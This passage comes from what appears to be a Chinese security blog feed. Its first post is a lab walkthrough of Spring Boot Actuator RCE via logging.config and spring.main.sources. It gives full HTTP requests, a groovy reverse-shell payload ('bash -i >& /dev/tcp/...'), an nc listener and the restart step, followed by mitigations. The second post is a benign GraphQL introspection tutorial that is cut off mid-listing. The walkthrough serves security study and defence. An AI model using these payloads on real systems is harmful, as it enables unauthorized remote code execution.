<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831181920688.png)</p>
<p>在攻击主机上监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>然后向&#x2F;actuator&#x2F;restart请求重启项目</p>
<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831180134395.png)</p>
<p>可以看到目标主机反向连接成功</p>
<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831180922722.png)</p>
<h5 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li><p>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</p>
</li>
<li><p>restart 重启应用后，程序会请求设置的 URL 地址</p>
</li>
<li><p>logback-classic<code>组件的</code>ch.qos.logback.classic.util.ContextInitializer.java<code>代码文件逻辑中会判断 url 是否以</code>groovy&#96; 结尾</p>
</li>
<li><p>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</p>
</li>
</ul>
<h4 id="2-12-restart-spring-main-sources-groovy-RCE"><a href="#2-12-restart-spring-main-sources-groovy-RCE" class="headerlink" title="2.12. restart spring.main.sources groovy RCE"></a>2.12. restart spring.main.sources groovy RCE</h4><h5 id="利用条件-14"><a href="#利用条件-14" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-13"><a href="#利用方法-13" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.main.sources 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-11"><a href="#利用实例-11" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure>



<p>以POST的方式向&#x2F;actuator&#x2F;env请求，设置spring.main.sources为groovy的url地址</p>
<p>请求报文如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210831175940842](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831175940842.png)</p>
<p>在攻击主机上监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>然后向&#x2F;actuator&#x2F;restart请求重启项目</p>
<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831180134395.png)</p>
<p>可以看到目标主机反向连接成功</p>
<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210831180922722.png)</p>
<h5 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li>spring-boot<code>组件中的</code>org.springframework.boot.BeanDefinitionLoader.java<code>文件代码逻辑中会判断 url 是否以</code>.groovy&#96; 结尾</li>
<li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
</ul>
<h1 id="3-安全措施"><a href="#3-安全措施" class="headerlink" title="3.安全措施"></a>3.安全措施</h1><h3 id="3-1开启security依赖功能"><a href="#3-1开启security依赖功能" class="headerlink" title="3.1开启security依赖功能"></a><strong>3.1开启security依赖功能</strong></h3><p>在项目的pom.xml文件下引入spring-boot-starter-security依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;groupId&gt;org.springframework.boot\&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;b01ec604e001e1de3f668bcd86398f62.png)</p>
<p>然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.security.enabled=true</span><br><span class="line"></span><br><span class="line">security.user.name=admin</span><br><span class="line"></span><br><span class="line">security.user.password=admin</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;808449fe71e832550f82817c0ae5b3a4.png)</p>
<h3 id="3-2禁用接口"><a href="#3-2禁用接口" class="headerlink" title="3.2禁用接口"></a><strong>3.2</strong>禁用接口</h3><p>如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上Spring<br>Boot也提供了安全限制功能。比如要禁用&#x2F;env接口，则可设置如下：</p>
<p>endpoints.env.enabled&#x3D; false</p>
<p>如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">endpoints.enabled = false</span><br><span class="line"></span><br><span class="line">endpoints.metrics.enabled = true</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>开发框架漏洞</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-web漏洞 -java开发框架</tag>
      </tags>
  </entry>
  <entry>
    <title>GraphQL之内省</title>
    <url>/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/</url>
    <content><![CDATA[<h1 id="GraphQL之内省"><a href="#GraphQL之内省" class="headerlink" title="GraphQL之内省"></a>GraphQL之内省</h1><p>GraphQL 是一种用于<a href="https://www.redhat.com/zh/topics/api/what-are-application-programming-interfaces">应用编程接口（API）</a>的查询语言。在服务器端运行时，它可以使客户端准确地获得所需的数据，没有任何冗余。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GraphQL 旨在让 API 变得快速、灵活并且为开发人员提供便利。GraphQL 允许开发人员构建相应的请求，从而通过单个 API 调用从多个数据源中提取数据。此外，GraphQL 还可让 API 维护人员灵活地添加或弃用字段，而不会影响现有查询。开发人员可以使用自己喜欢的方法来构建 API，并且 GraphQL 规范将确保它们以可预测的方式在客户端发挥作用。</p>
<h2 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h2><p>GraphQL 模式由对象类型组成，它表示可以请求哪种对象以及它有哪些字段。当用户<strong>查询</strong>时，GraphQL 会根据模式对查询进行验证。随后，GraphQL 将执行经过验证的查询。API 开发人员将模式中的每个字段附加到名为<strong>解析器</strong>的函数中。执行期间，系统将调用解析器来生成相应的值。</p>
<p>例如，一个 GraphQL 服务告诉我们当前登录用户是 <code>me</code>，这个用户的名称可能像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Query &#123;</span><br><span class="line">  me: User</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">type User &#123;</span><br><span class="line">  id: ID</span><br><span class="line">  name: String</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一并的还有每个类型上字段的解析函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Query_me</span>(<span class="params">request</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request.auth.user;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">User_name</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> user.getName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦一个 GraphQL 服务运行起来（通常在 web 服务的一个 URL 上），它就能接收 GraphQL 查询，并验证和执行。接收到的查询首先会被检查确保它只引用了已定义的类型和字段，然后运行指定的解析函数来生成结果。</p>
<p>例如这个查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  me &#123;</span><br><span class="line">    name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会产生这样的JSON结果：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;me&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Luke Skywalker&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查询示例"><a href="#查询示例" class="headerlink" title="查询示例"></a>查询示例</h2><p>我们来看看来自 GraphQL 项目网站 <a href="http://graphql.org/">graphql.org</a> 的 3 个示例。</p>
<p>第一个示例为客户端构造GraphQL查询，要求API以指定的形态返回特定字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> me &#123;</span><br><span class="line">   name</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到API按照 指定格式返回JSON数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;me&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;Dorothy&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端也可以作为 GraphQL 查询的一部分来传递参数，如下例所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  human(id: &quot;1000&quot;) &#123;</span><br><span class="line">    name</span><br><span class="line">    location</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;human&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Dorothy,</span><br><span class="line">      &quot;location&quot;: &quot;Kansas&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里开始，事情变得更加有趣。GraphQL 允许用户定义可复用的片段并分配变量。</p>
<p>假设您需要请求一个 ID 列表，然后为每个 ID 请求一系列记录。借助 GraphQL，您可以构建一个查询，然后通过单个 API 调用来提取所需的所有内容。</p>
<p>查询方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query HeroComparison($first: Int = 3) &#123;</span><br><span class="line">  leftComparison: hero(location: KANSAS) &#123;</span><br><span class="line">    ...comparisonFields</span><br><span class="line">  &#125;</span><br><span class="line">  rightComparison: hero(location: OZ) &#123;</span><br><span class="line">    ...comparisonFields</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment comparisonFields on Character &#123;</span><br><span class="line">  name</span><br><span class="line">  friendsConnection(first: $first) &#123;</span><br><span class="line">    totalCount</span><br><span class="line">    edges &#123;</span><br><span class="line">      node &#123;</span><br><span class="line">        name</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>可能生成以下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;leftComparison&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Dorothy&quot;,</span><br><span class="line">      &quot;friendsConnection&quot;: &#123;</span><br><span class="line">        &quot;totalCount&quot;: 4,</span><br><span class="line">        &quot;edges&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Aunt Em&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Uncle Henry&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Toto&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;rightComparison&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Wizard&quot;,</span><br><span class="line">      &quot;friendsConnection&quot;: &#123;</span><br><span class="line">        &quot;totalCount&quot;: 3,</span><br><span class="line">        &quot;edges&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Scarecrow&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Tin Man&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;Lion&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内省"><a href="#内省" class="headerlink" title="内省"></a>内省</h2><p>当我们需要知道GraphQL支持哪些查询时，可通过GraphQL内省系统完成。</p>
<p>练习平台:<a href="https://docs.github.com/cn/graphql/overview/explorer">Explorer - GitHub Docs</a></p>
<h3 id="查询类型"><a href="#查询类型" class="headerlink" title="查询类型"></a>查询类型</h3><p>我们可以通过__schema字段来查询GraphQL哪些类型是可用的，查询的根类型一定是要有类型字段的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query &#123; </span><br><span class="line">  __schema &#123; </span><br><span class="line">    types&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到响应包中返回的类型</p>
<img src="/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/image-20220315175431030.png" class title="image-20220315175431030">

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;__schema&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;types&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AbortQueuedMigrationsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AbortQueuedMigrationsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptEnterpriseAdministratorInvitationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptEnterpriseAdministratorInvitationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptTopicSuggestionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AcceptTopicSuggestionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Actor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ActorLocation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ActorType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddAssigneesToAssignableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddAssigneesToAssignablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddEnterpriseSupportEntitlementInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddEnterpriseSupportEntitlementPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddLabelsToLabelableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddLabelsToLabelablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectNextItemInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddProjectNextItemPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewThreadInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddPullRequestReviewThreadPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddReactionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddReactionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddStarInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddStarPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddUpvoteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddUpvotePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AddedToProjectEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;App&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveDeploymentsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveDeploymentsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ApproveVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ArchiveRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ArchiveRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Assignable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AssignedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Assignee&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditEntryActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditLogOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AuditLogOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoMergeDisabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoMergeEnabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoMergeRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoRebaseEnabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutoSquashEnabledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AutomaticBaseChangeFailedEvent&quot;</span></span><br><span class="line">        